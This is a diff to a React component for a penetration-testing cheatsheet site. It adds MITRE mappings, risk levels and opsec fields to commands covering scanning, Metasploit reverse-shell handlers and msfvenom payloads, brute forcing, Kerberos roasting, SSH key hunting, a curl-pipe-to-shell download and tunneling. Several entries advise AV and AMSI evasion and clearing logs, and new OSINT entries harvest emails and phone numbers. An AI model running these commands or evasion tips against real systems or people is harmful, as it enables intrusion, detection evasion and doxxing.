@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { motion } from 'framer-motion';
 import { 
   Bomb, 
@@ -23,15 +23,50 @@ import {
   Code,
   Plus,
   Trash2,
-  Mail
+  Mail,
+  Eye,
+  Lock,
+  Wifi,
+  Smartphone,
+  Radio,
+  Bug,
+  AlertTriangle,
+  FileText,
+  Network,
+  Cpu,
+  HardDrive,
+  Key,
+  Users,
+  Activity,
+  Crosshair,
+  Target,
+  Layers,
+  GitBranch,
+  Wrench,
+  Microscope,
+  Brain,
+  Skull,
+  Filter
 } from 'lucide-react';
 import LiquidGlass from '@/components/ui/liquid-glass';
+
 
 // Define cheatsheet data structure
 interface Command {
   command: string;
   description: string;
   example?: string;
+  mitreTechnique?: string;
+  mitreId?: string;
+  opsecNotes?: string;
+  prerequisites?: string;
+  riskLevel?: 'Low' | 'Medium' | 'High' | 'Critical';
+  platform?: string[];
+  category?: string;
+  references?: string[];
+  evasionTips?: string;
+  detectionMethods?: string;
+  cleanup?: string;
 }
 
 interface Subcategory {
@@ -87,32 +122,114 @@ const cheatsheetData: Category[] = [
           {
             command: 'nmap -sV -sC -p- {target}',
             description: 'Full port scan with service detection and default scripts',
-            example: 'nmap -sV -sC -p- 192.168.1.1'
+            example: 'nmap -sV -sC -p- 192.168.1.1',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Full port scan is noisy and easily detected',
+            evasionTips: 'Use timing options (-T1 to -T3) and fragment packets (-f)',
+            detectionMethods: 'IDS/IPS signatures, port scan detection tools'
           },
           {
             command: 'nmap -sn {network_range}',
             description: 'Network sweep/ping scan to identify live hosts',
-            example: 'nmap -sn 192.168.1.0/24'
+            example: 'nmap -sn 192.168.1.0/24',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Ping sweeps are commonly logged and detected',
+            evasionTips: 'Use -Pn to skip ping discovery, randomize timing with -T options',
+            detectionMethods: 'ICMP monitoring, network behavior analysis'
           },
           {
             command: 'nmap --script vuln {target}',
             description: 'Scan for common vulnerabilities',
-            example: 'nmap --script vuln 10.10.10.10'
+            example: 'nmap --script vuln 10.10.10.10',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.002',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Vulnerability scripts can trigger IDS/IPS alerts',
+            evasionTips: 'Use specific scripts instead of vuln category, add delays',
+            prerequisites: 'Nmap scripting engine (NSE) scripts installed'
           },
           {
             command: 'netdiscover -r {network_range}',
             description: 'Discover active hosts on the network',
-            example: 'netdiscover -r 192.168.1.0/24'
+            example: 'netdiscover -r 192.168.1.0/24',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            opsecNotes: 'ARP requests are visible to network monitoring tools',
+            evasionTips: 'Use passive mode (-p) to avoid sending ARP requests',
+            prerequisites: 'Root privileges for raw socket access'
           },
           {
             command: 'enum4linux -a {target}',
             description: 'Enumerate SMB shares on Windows/Samba systems',
-            example: 'enum4linux -a 192.168.1.10'
+            example: 'enum4linux -a 192.168.1.10',
+            mitreTechnique: 'Network Share Discovery',
+            mitreId: 'T1135',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            opsecNotes: 'SMB enumeration attempts are logged by Windows Event Log',
+            evasionTips: 'Use null sessions carefully, avoid brute force attempts',
+            detectionMethods: 'Windows Security Event ID 4625 (failed logons)'
           },
           {
             command: 'smbclient -L //{target}/ -N',
             description: 'List SMB shares anonymously',
-            example: 'smbclient -L //192.168.1.10/ -N'
+            example: 'smbclient -L //192.168.1.10/ -N',
+            mitreTechnique: 'Network Share Discovery',
+            mitreId: 'T1135',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Anonymous SMB enumeration is logged by most systems'
+          },
+          {
+            command: 'masscan -p1-65535 {target_range} --rate=1000',
+            description: 'High-speed port scanner for large networks',
+            example: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'High',
+            platform: ['Linux'],
+            opsecNotes: 'Extremely fast and noisy, easily detected',
+            evasionTips: 'Reduce rate and use source port randomization',
+            prerequisites: 'Root privileges required'
+          },
+          {
+            command: 'rustscan -a {target} -- -sV -sC',
+            description: 'Fast port scanner with nmap integration',
+            example: 'rustscan -a 192.168.1.1 -- -sV -sC',
+            mitreTechnique: 'Network Service Discovery',
+            mitreId: 'T1046',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/RustScan/RustScan']
+          },
+          {
+            command: 'nuclei -t {template_path} -u {target}',
+            description: 'Vulnerability scanner with community templates',
+            example: 'nuclei -t /root/nuclei-templates/ -u https://example.com',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.002',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/projectdiscovery/nuclei']
+          },
+          {
+            command: 'ldapsearch -x -H ldap://{target} -b "dc={domain},dc={tld}"',
+            description: 'LDAP enumeration and information gathering',
+            example: 'ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"',
+            mitreTechnique: 'Remote System Discovery',
+            mitreId: 'T1018',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'LDAP queries are logged by domain controllers'
           }
         ]
       },
@@ -123,46 +240,110 @@ const cheatsheetData: Category[] = [
           {
             command: 'searchsploit {search_term}',
             description: 'Search for exploits on Exploit-DB',
-            example: 'searchsploit apache 2.4.49'
+            example: 'searchsploit apache 2.4.49',
+            mitreTechnique: 'Gather Victim Host Information',
+            mitreId: 'T1592.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Offline tool, no network activity generated',
+            prerequisites: 'Exploit-DB database installed locally',
+            references: ['https://www.exploit-db.com/searchsploit']
           },
           {
             command: 'msfconsole',
             description: 'Launch Metasploit Framework console',
+            example: 'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"',
+            mitreTechnique: 'Exploitation for Client Execution',
+            mitreId: 'T1203',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Metasploit payloads are heavily signatured by AV',
+            evasionTips: 'Use custom encoders, avoid default payloads, use evasion modules',
+            prerequisites: 'Metasploit Framework installed'
           },
           {
             command: 'msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format}',
             description: 'Generate payload with MSFvenom',
-            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe'
+            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe',
+            mitreTechnique: 'Command and Scripting Interpreter',
+            mitreId: 'T1059',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Default payloads are easily detected by modern AV',
+            evasionTips: 'Use encoders (-e), iterations (-i), custom templates (-x)',
+            cleanup: 'Remove payload files after use, clear command history'
           },
           {
             command: 'nc -nvlp {port}',
             description: 'Set up a netcat listener',
-            example: 'nc -nvlp 4444'
+            example: 'nc -nvlp 4444',
+            mitreTechnique: 'Non-Application Layer Protocol',
+            mitreId: 'T1095',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Listening ports can be detected by port scans',
+            evasionTips: 'Use non-standard ports, bind to specific interfaces',
+            detectionMethods: 'Network monitoring, netstat analysis'
           },
           {
             command: 'hydra -l {username} -P {wordlist} {target} {service}',
             description: 'Brute force authentication with Hydra',
-            example: 'hydra -l admin -P ./passwords.txt 192.168.1.1 ssh'
+            example: 'hydra -l admin -P ./passwords.txt 192.168.1.1 ssh',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.001',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Brute force attempts are heavily logged and detected',
+            evasionTips: 'Use delays (-w), limit attempts (-f), use proxy chains',
+            detectionMethods: 'Failed authentication logs, account lockout policies'
           },
           {
             command: 'crackmapexec {protocol} {target} -u {username} -p {password}',
             description: 'Test credentials across multiple protocols',
-            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password123'
+            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
+            mitreTechnique: 'Valid Accounts',
+            mitreId: 'T1078',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Authentication attempts are logged by target systems',
+            evasionTips: 'Use --continue-on-success, limit concurrent threads',
+            references: ['https://github.com/byt3bl33d3r/CrackMapExec']
           },
           {
             command: 'impacket-GetNPUsers {domain}/ -usersfile {users} -format hashcat -outputfile {output}',
             description: 'AS-REP Roasting attack',
-            example: 'impacket-GetNPUsers contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt'
+            example: 'impacket-GetNPUsers contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt',
+            mitreTechnique: 'Steal or Forge Kerberos Tickets',
+            mitreId: 'T1558.004',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Kerberos requests are logged by domain controllers',
+            prerequisites: 'Valid domain user list, network access to DC',
+            references: ['https://github.com/SecureAuthCorp/impacket']
           },
           {
             command: 'john --wordlist={wordlist} {hash_file}',
             description: 'Crack password hashes with John the Ripper',
-            example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'
+            example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Offline attack, no network activity',
+            evasionTips: 'Use custom rules, hybrid attacks, distributed cracking',
+            prerequisites: 'Hash files obtained from target systems'
           },
           {
             command: 'hashcat -m {hash_type} {hash_file} {wordlist}',
             description: 'GPU-accelerated password cracking',
-            example: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt'
+            example: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt',
+            mitreTechnique: 'Brute Force',
+            mitreId: 'T1110.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows'],
+            opsecNotes: 'Offline attack, high GPU utilization may be noticeable',
+            prerequisites: 'GPU with OpenCL/CUDA support, appropriate drivers',
+            evasionTips: 'Use rule-based attacks, mask attacks for targeted cracking'
           }
         ]
       },
@@ -173,54 +354,154 @@ const cheatsheetData: Category[] = [
           {
             command: 'sudo -l',
             description: 'List available sudo commands for the current user',
+            example: 'sudo -l',
+            mitreTechnique: 'Sudo and Sudo Caching',
+            mitreId: 'T1548.003',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Command execution may be logged in auth.log',
+            evasionTips: 'Check for NOPASSWD entries, wildcard permissions',
+            detectionMethods: 'Sudo usage logs, authentication monitoring'
           },
           {
             command: 'find / -perm -u=s -type f 2>/dev/null',
             description: 'Find SUID binaries',
+            example: 'find / -perm -u=s -type f 2>/dev/null | head -20',
+            mitreTechnique: 'Setuid and Setgid',
+            mitreId: 'T1548.001',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'File system traversal may trigger monitoring',
+            evasionTips: 'Focus on non-standard SUID binaries, check GTFOBins',
+            references: ['https://gtfobins.github.io/']
           },
           {
             command: 'cat /etc/crontab',
             description: 'Check for scheduled tasks that may be hijacked',
+            example: 'cat /etc/crontab && ls -la /etc/cron.*/',
+            mitreTechnique: 'Scheduled Task/Job',
+            mitreId: 'T1053.003',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            opsecNotes: 'File access may be logged by file integrity monitoring',
+            evasionTips: 'Check user crontabs, look for writable cron scripts',
+            detectionMethods: 'File access monitoring, cron job analysis'
           },
           {
             command: 'linpeas.sh',
             description: 'Run LinPEAS for Linux privilege escalation enumeration',
+            example: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            opsecNotes: 'Comprehensive enumeration may trigger EDR alerts',
+            evasionTips: 'Use -q for quiet mode, redirect output to avoid detection',
+            references: ['https://github.com/carlospolop/PEASS-ng']
           },
           {
             command: 'grep -v -E "^#" /etc/passwd | awk -F: \'$3 == 0 { print $1}\'',
             description: 'Find all users with UID 0 (root equivalent)',
+            example: 'grep -v -E "^#" /etc/passwd | awk -F: \'$3 == 0 { print $1}\'',
+            mitreTechnique: 'Account Discovery',
+            mitreId: 'T1087.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'File access is typically not logged for /etc/passwd',
+            evasionTips: 'Check for hidden users, unusual UID assignments'
           },
           {
             command: 'find / -writable -type d 2>/dev/null',
             description: 'Find world-writable directories',
+            example: 'find / -writable -type d 2>/dev/null | grep -v proc | head -10',
+            mitreTechnique: 'File and Directory Discovery',
+            mitreId: 'T1083',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Extensive file system searches may be detected',
+            evasionTips: 'Focus on specific directories, avoid full system scans'
           },
           {
             command: 'getcap -r / 2>/dev/null',
             description: 'Find files with capabilities set',
+            example: 'getcap -r / 2>/dev/null | grep -v "= $"',
+            mitreTechnique: 'Abuse Elevation Control Mechanism',
+            mitreId: 'T1548',
+            riskLevel: 'Medium',
+            platform: ['Linux'],
+            opsecNotes: 'Capability enumeration may trigger security monitoring',
+            evasionTips: 'Look for cap_setuid, cap_dac_override capabilities',
+            prerequisites: 'libcap-dev package installed for getcap command'
           },
           {
             command: 'ps aux | grep root',
             description: 'List processes running as root',
+            example: 'ps aux | grep root | grep -v "\\[.*\\]"',
+            mitreTechnique: 'Process Discovery',
+            mitreId: 'T1057',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Process enumeration is typically not logged',
+            evasionTips: 'Look for unusual services, check process arguments'
           },
           {
             command: 'netstat -tulpn',
             description: 'Show network connections and listening ports',
+            example: 'netstat -tulpn | grep LISTEN',
+            mitreTechnique: 'System Network Connections Discovery',
+            mitreId: 'T1049',
+            riskLevel: 'Low',
+            platform: ['Linux'],
+            opsecNotes: 'Network enumeration is rarely logged',
+            evasionTips: 'Look for internal services, unusual port bindings',
+            detectionMethods: 'Network monitoring, anomaly detection'
           },
           {
             command: 'cat /etc/passwd | grep -v nologin',
             description: 'Find users with login shells',
+            example: 'cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1',
+            mitreTechnique: 'Account Discovery',
+            mitreId: 'T1087.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Standard file access, typically not monitored',
+            evasionTips: 'Check for service accounts with shells, unusual users'
           },
           {
             command: 'find / -name "*.conf" -exec ls -la {} \\; 2>/dev/null',
             description: 'Find configuration files',
+            example: 'find /etc /opt /var -name "*.conf" -type f 2>/dev/null | head -20',
+            mitreTechnique: 'File and Directory Discovery',
+            mitreId: 'T1083',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'File system searches may be logged by file integrity monitoring',
+            evasionTips: 'Focus on specific directories, check for sensitive configs'
           },
           {
             command: 'find / -name "authorized_keys" 2>/dev/null',
             description: 'Find SSH authorized_keys files',
+            example: 'find /home /root -name "authorized_keys" -type f 2>/dev/null',
+            mitreTechnique: 'Unsecured Credentials',
+            mitreId: 'T1552.004',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'SSH key discovery may indicate lateral movement attempts',
+            evasionTips: 'Check for backup keys, unusual key locations',
+            detectionMethods: 'File access monitoring, SSH key management tools'
           },
           {
             command: 'find / -name "id_rsa" 2>/dev/null',
             description: 'Find SSH private keys',
+            example: 'find /home /root /opt -name "id_*" -type f 2>/dev/null',
+            mitreTechnique: 'Private Keys',
+            mitreId: 'T1552.004',
+            riskLevel: 'High',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Private key access is critical security event',
+            evasionTips: 'Look for keys in unusual locations, check permissions',
+            detectionMethods: 'File access monitoring, key management systems',
+            cleanup: 'Avoid copying keys, use in-place if possible'
           }
         ]
       },
@@ -231,39 +512,104 @@ const cheatsheetData: Category[] = [
           {
             command: 'winPEAS.exe',
             description: 'Run WinPEAS for Windows privilege escalation enumeration',
+            example: 'winPEAS.exe quiet cmd fast',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'Comprehensive enumeration may trigger EDR alerts',
+            evasionTips: 'Use quiet mode, redirect output to avoid detection',
+            references: ['https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS']
           },
           {
             command: 'PowerUp.ps1 Invoke-AllChecks',
             description: 'Run PowerUp checks for common Windows privesc paths',
+            example: 'powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"',
+            mitreTechnique: 'Abuse Elevation Control Mechanism',
+            mitreId: 'T1548',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'PowerShell execution may be logged and monitored',
+            evasionTips: 'Use AMSI bypass, obfuscate PowerShell commands',
+            references: ['https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1']
           },
           {
             command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
             description: 'Check for AlwaysInstallElevated registry setting',
+            example: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+            mitreTechnique: 'Abuse Elevation Control Mechanism',
+            mitreId: 'T1548.002',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Registry queries are typically logged',
+            evasionTips: 'Check both HKLM and HKCU, create MSI payload if enabled'
           },
           {
             command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"',
             description: 'Find services with unquoted paths',
+            example: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v "c:\\program files"',
+            mitreTechnique: 'Hijack Execution Flow',
+            mitreId: 'T1574.009',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Service enumeration may be logged by security tools',
+            evasionTips: 'Look for services with spaces in paths, check write permissions'
           },
           {
             command: 'sc qc {servicename}',
             description: 'Query configuration of a Windows service',
-            example: 'sc qc spooler'
+            example: 'sc qc spooler',
+            mitreTechnique: 'System Services',
+            mitreId: 'T1007',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            opsecNotes: 'Service queries are typically not heavily monitored',
+            evasionTips: 'Check service permissions, binary path, and dependencies'
           },
           {
             command: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
             description: 'Check for services Authenticated Users can modify',
+            example: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul',
+            mitreTechnique: 'System Services',
+            mitreId: 'T1007',
+            riskLevel: 'Medium',
+            platform: ['Windows'],
+            opsecNotes: 'AccessChk execution may be detected by EDR',
+            prerequisites: 'AccessChk from Sysinternals suite',
+            references: ['https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk']
           },
           {
             command: 'whoami /priv',
             description: 'Check current user privileges',
+            example: 'whoami /priv | findstr /i "SeImpersonatePrivilege\\|SeAssignPrimaryTokenPrivilege\\|SeBackupPrivilege\\|SeRestorePrivilege"',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            opsecNotes: 'Standard Windows command, typically not monitored',
+            evasionTips: 'Look for dangerous privileges like SeImpersonatePrivilege'
           },
           {
             command: 'whoami /groups',
             description: 'Check current user group memberships',
+            example: 'whoami /groups | findstr /i "administrators\\|backup\\|remote"',
+            mitreTechnique: 'System Information Discovery',
+            mitreId: 'T1082',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            opsecNotes: 'Standard Windows command, typically not monitored',
+            evasionTips: 'Look for privileged groups and special access rights'
           },
           {
             command: 'net localgroup administrators',
             description: 'List local administrators',
+            example: 'net localgroup administrators',
+            mitreTechnique: 'Account Discovery',
+            mitreId: 'T1087.001',
+            riskLevel: 'Low',
+            platform: ['Windows'],
+            opsecNotes: 'Standard administrative command, may be logged',
+            evasionTips: 'Check for unusual admin accounts, service accounts'
           },
           {
             command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
@@ -294,27 +640,62 @@ const cheatsheetData: Category[] = [
           {
             command: 'ssh -L {local_port}:{remote_host}:{remote_port} {user}@{ssh_server}',
             description: 'SSH local port forwarding',
-            example: 'ssh -L 8080:internal-app:80 user@compromised-host'
+            example: 'ssh -L 8080:internal-app:80 user@compromised-host',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'SSH connections are logged, unusual port forwards may be detected',
+            evasionTips: 'Use common ports, limit connection duration',
+            detectionMethods: 'SSH log analysis, network flow monitoring'
           },
           {
             command: 'ssh -D {local_port} {user}@{ssh_server}',
             description: 'SSH dynamic port forwarding (SOCKS proxy)',
-            example: 'ssh -D 1080 user@compromised-host'
+            example: 'ssh -D 1080 user@compromised-host',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'SOCKS proxy usage can be detected by network monitoring',
+            evasionTips: 'Use with proxychains, rotate proxy endpoints',
+            cleanup: 'Terminate SSH sessions, clear connection logs'
           },
           {
             command: 'ssh -R {remote_port}:{local_host}:{local_port} {user}@{ssh_server}',
             description: 'SSH remote port forwarding',
-            example: 'ssh -R 8080:localhost:80 user@public-server'
+            example: 'ssh -R 8080:localhost:80 user@public-server',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Reverse tunnels are highly suspicious and monitored',
+            evasionTips: 'Use legitimate-looking services, limit bandwidth',
+            detectionMethods: 'Outbound connection monitoring, SSH log analysis'
           },
           {
             command: 'proxychains {command}',
             description: 'Route command through proxy defined in proxychains.conf',
-            example: 'proxychains nmap -sT -Pn 10.10.10.10'
+            example: 'proxychains nmap -sT -Pn 10.10.10.10',
+            mitreTechnique: 'Proxy',
+            mitreId: 'T1090',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Proxy usage patterns can be detected',
+            evasionTips: 'Use multiple proxy chains, randomize timing',
+            prerequisites: 'Proxychains configuration file setup'
           },
           {
             command: 'socat TCP-LISTEN:{local_port},fork TCP:{target}:{target_port}',
             description: 'Create a relay with socat',
-            example: 'socat TCP-LISTEN:8080,fork TCP:internal-server:80'
+            example: 'socat TCP-LISTEN:8080,fork TCP:internal-server:80',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Port relays can be detected by network monitoring',
+            evasionTips: 'Use common ports, implement connection limits',
+            cleanup: 'Kill socat processes, clear network connections'
           }
         ]
       }
@@ -1028,8 +1409,8 @@ const cheatsheetData: Category[] = [
         ]
       },
       {
-        name: 'File Upload',
-        description: 'File upload vulnerability techniques',
+        name: 'File Upload Exploits',
+        description: 'Advanced file upload exploitation techniques',
         commands: [
           {
             command: 'weevely generate {password} {output_file}',
@@ -1468,9 +1849,9 @@ const cheatsheetData: Category[] = [
     ]
   },
   {
-    name: 'Mobile Security',
+    name: 'Mobile App Testing',
     icon: <HelpCircle className="w-5 h-5" />,
-    description: 'Mobile application and device security testing',
+    description: 'Basic mobile application security testing',
     subcategories: [
       {
         name: 'Android Testing',
@@ -1646,6 +2027,1264 @@ const cheatsheetData: Category[] = [
         ]
       }
     ]
+  },
+  {
+    name: 'OSINT & Reconnaissance',
+    icon: <Eye className="w-5 h-5" />,
+    description: 'Open Source Intelligence gathering and reconnaissance techniques',
+    subcategories: [
+      {
+        name: 'Domain & Subdomain Discovery',
+        description: 'Comprehensive domain reconnaissance techniques',
+        commands: [
+          {
+            command: 'subfinder -d {domain} -all -recursive -o subdomains.txt',
+            description: 'Comprehensive subdomain discovery with all sources',
+            example: 'subfinder -d example.com -all -recursive -o subdomains.txt',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.001',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Uses passive sources, low detection risk',
+            references: ['https://github.com/projectdiscovery/subfinder']
+          },
+          {
+            command: 'amass enum -active -d {domain} -config config.ini -o amass_results.txt',
+            description: 'Advanced subdomain enumeration with active techniques',
+            example: 'amass enum -active -d example.com -config config.ini -o amass_results.txt',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.002',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Active scanning may trigger detection systems',
+            evasionTips: 'Use rate limiting and distributed scanning',
+            references: ['https://github.com/OWASP/Amass']
+          },
+          {
+            command: 'assetfinder --subs-only {domain} | httprobe -c 50 | tee live_subdomains.txt',
+            description: 'Find subdomains and probe for live hosts',
+            example: 'assetfinder --subs-only example.com | httprobe -c 50 | tee live_subdomains.txt',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.001',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'HTTP probing generates logs on target servers'
+          },
+          {
+            command: 'dnsrecon -d {domain} -t axfr,brt,srv,std',
+            description: 'Comprehensive DNS reconnaissance',
+            example: 'dnsrecon -d example.com -t axfr,brt,srv,std',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.002',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Zone transfer attempts are logged by DNS servers'
+          },
+          {
+            command: 'fierce --domain {domain} --subdomains accounts,admin,api,dev,mail,test,www',
+            description: 'DNS reconnaissance with custom subdomain list',
+            example: 'fierce --domain example.com --subdomains accounts,admin,api,dev,mail,test,www',
+            mitreTechnique: 'Active Scanning',
+            mitreId: 'T1595.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          }
+        ]
+      },
+      {
+        name: 'Advanced Social Media Intelligence',
+        description: 'Advanced intelligence gathering from social media platforms',
+        commands: [
+          {
+            command: 'sherlock {username}',
+            description: 'Find usernames across social networks',
+            example: 'sherlock john_doe',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.003',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Passive reconnaissance, very low detection risk',
+            references: ['https://github.com/sherlock-project/sherlock']
+          },
+          {
+            command: 'twint -u {username} --email --phone --hide-output -o {output_file}',
+            description: 'Extract emails and phone numbers from Twitter',
+            example: 'twint -u target_user --email --phone --hide-output -o twitter_intel.txt',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Uses Twitter API, consider rate limiting'
+          },
+          {
+            command: 'linkedin2username -c "{company}" -n "{first_name} {last_name}"',
+            description: 'Generate potential usernames from LinkedIn profiles',
+            example: 'linkedin2username -c "Acme Corp" -n "John Doe"',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.003',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'holehe {email}',
+            description: 'Check if email is registered on various platforms',
+            example: 'holehe john.doe@example.com',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/megadose/holehe']
+          }
+        ]
+      },
+      {
+        name: 'Email Intelligence',
+        description: 'Email reconnaissance and validation techniques',
+        commands: [
+          {
+            command: 'theHarvester -d {domain} -l 500 -b all -f harvester_results',
+            description: 'Comprehensive email harvesting from all sources',
+            example: 'theHarvester -d example.com -l 500 -b all -f harvester_results',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Passive collection from public sources'
+          },
+          {
+            command: 'h8mail -t {email} --chase --power-chase',
+            description: 'Email OSINT and breach hunting',
+            example: 'h8mail -t john.doe@example.com --chase --power-chase',
+            mitreTechnique: 'Gather Victim Identity Information',
+            mitreId: 'T1589.002',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/khast3x/h8mail']
+          },
+          {
